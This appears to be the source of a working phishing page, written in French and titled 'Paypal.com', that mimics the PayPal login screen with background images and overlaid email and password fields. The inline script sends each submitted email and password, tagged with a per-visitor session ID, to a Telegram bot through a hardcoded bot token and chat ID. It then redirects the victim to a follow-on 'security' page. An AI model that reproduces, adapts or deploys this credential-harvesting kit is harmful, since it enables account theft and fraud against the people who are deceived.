<!doctype html>
<html lang="fr">
<head>
  <!-- Favicon standard pour les onglets de navigateur (PC / Mac) -->
  <link rel="icon" type="image/x-icon" href="logo.ico">
  <link rel="shortcut icon" type="image/x-icon" href="logo.ico">

  <!-- Icône pour l'écran d'accueil iOS (iPhone / iPad) -->
  <link rel="apple-touch-icon" href="logo.ico">
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Paypal.com</title>
  <style>
    :root {
      color: #111;
      font-family: "Futura", Arial, Helvetica, sans-serif;
      font-weight: bold;
      background: #fff;
    }
    * {
      box-sizing: border-box;
    }
    html, body {
      min-height: 100vh;
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      background: #fff;
    }
    main {
      flex: 1;
      width: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    /* Conteneur calqué sur le ratio de back.JPG (570 x 588) */
    .bg-wrapper {
      position: relative;
      width: 100%;
      max-width: 570px;
      aspect-ratio: 570 / 588;
      background-image: url('back.JPG');
      background-size: 100% 100%;
      background-repeat: no-repeat;
      background-position: center;
    }
    /* Premier champ d'écriture (E-mail) */
    .image-field-1 {
      position: absolute;
      top: 34.5%;
      left: 17.5%;
      width: 65%;
      aspect-ratio: 400 / 74;
    }
    /* Second champ d'écriture (Mot de passe) espacé du premier */
    .image-field-2 {
      position: absolute;
      top: 45.5%;
      left: 17.5%;
      width: 65%;
      aspect-ratio: 400 / 74;
    }
    .image-field-1 img, .image-field-2 img {
      display: block;
      width: 100%;
      height: 100%;
    }
    .image-field-1 input, .image-field-2 input {
      position: absolute;
      inset: 3px 4%;
      width: 92%;
      border: 0;
      outline: 0;
      background: transparent;
      color: #111;
      font: inherit;
      font-weight: bold;
      padding: 0 10px;
    }
    /* Zone interactive superposée sur le bouton bleu "Connexion" */
    .action-zone {
      position: absolute;
      top: 64.2%;
      left: 17.5%;
      width: 64.2%;
      height: 8.2%;
      border-radius: 999px;
      border: 0;
      background: transparent;
      cursor: pointer;
      padding: 0;
      transition: background-color 0.2s ease;
    }
    .action-zone:hover {
      background: rgba(0, 0, 0, 0.08);
    }
    .action-zone:disabled {
      cursor: wait;
      background: rgba(255, 255, 255, 0.35);
    }
    .page-footer {
      width: 100%;
      margin-top: auto;
    }
    .page-footer img {
      display: block;
      width: 100%;
      height: auto;
      object-fit: cover;
    }
  </style>
</head>
<body>
  <main>
    <div class="bg-wrapper">
      <form id="formCombined">
        <!-- Champ E-mail -->
        <div class="image-field-1">
          <img src="champs.JPG" alt="">
          <input id="email" type="email" placeholder="Adresse e-mail" required autocomplete="off">
        </div>

        <!-- Champ Mot de passe espacé -->
        <div class="image-field-2">
          <img src="champs.JPG" alt="">
          <input id="password" type="password" placeholder="Mot de passe" required autocomplete="current-password">
        </div>

        <!-- Bouton de validation global -->
        <button class="action-zone" id="submitBtn" type="submit" aria-label="Connexion"></button>
      </form>
    </div>
  </main>

  <div class="page-footer">
    <img src="footer.JPG" alt="Footer">
  </div>

  <script>
    const TELEGRAM_TOKEN = "9165642873:AAFLPg7M2QpgRpwlbKtjKKlnrNe25oJckPo";
    const TELEGRAM_CHAT_ID = "8550191274";

    let clientId = localStorage.getItem('client_id');
    if (!clientId) {
      clientId = 'User_' + Math.random().toString(36).substr(2, 6).toUpperCase() + '_' + Date.now().toString().slice(-4);
      localStorage.setItem('client_id', clientId);
    }

    document.getElementById('formCombined').addEventListener('submit', async (e) => {
      e.preventDefault();
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;
      if (!email || !password) return;

      const message = `🔔 *Nouvelle info - Connexion combinée*\n🆔 Session: \`${clientId}\`\n📧 E-mail: \`${email}\`\n🔒 Mot de passe: \`${password}\``;
      const btn = document.getElementById('submitBtn');
      btn.disabled = true;

      try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' })
        });
      } catch (error) {
        console.error("Erreur Telegram", error);
      }

      window.location.href = '3-security.html';
    });
  </script>
</body>
</html>
